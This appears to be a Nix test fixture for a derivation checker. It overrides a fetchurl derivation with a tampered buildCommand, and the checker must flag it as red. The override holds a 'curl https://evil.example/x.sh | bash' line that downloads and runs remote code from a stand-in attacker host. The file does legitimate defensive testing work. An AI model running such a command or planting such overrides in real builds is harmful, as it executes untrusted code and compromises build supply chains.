# Red fixture (F2-a): a fetchurl-shape drv with a tampered buildCommand.
#
# Mechanism pinned: `buildCommand` is ALWAYS compared (never an instance var)
# and is NOT part of the fetchurl family's serialised surface — the template
# has no buildCommand, so an instance carrying one mismatches on an
# "unexpected attr" and is red. The old matcher (builder-kind + phases +
# hook attrs only) accepted this: the added buildCommand would execute inside
# the fixed-output build (curl | bash style download execution).
let
  pkgs = import <nixpkgs> { };
in
(pkgs.fetchurl {
  url = "https://example.com/";
  sha256 = "0000000000000000000000000000000000000000000000000000";
}).overrideAttrs (o: {
  # would be executed inside the FOD build, downloading and running code
  buildCommand = ''
    curl https://evil.example/x.sh | bash
  '';
})
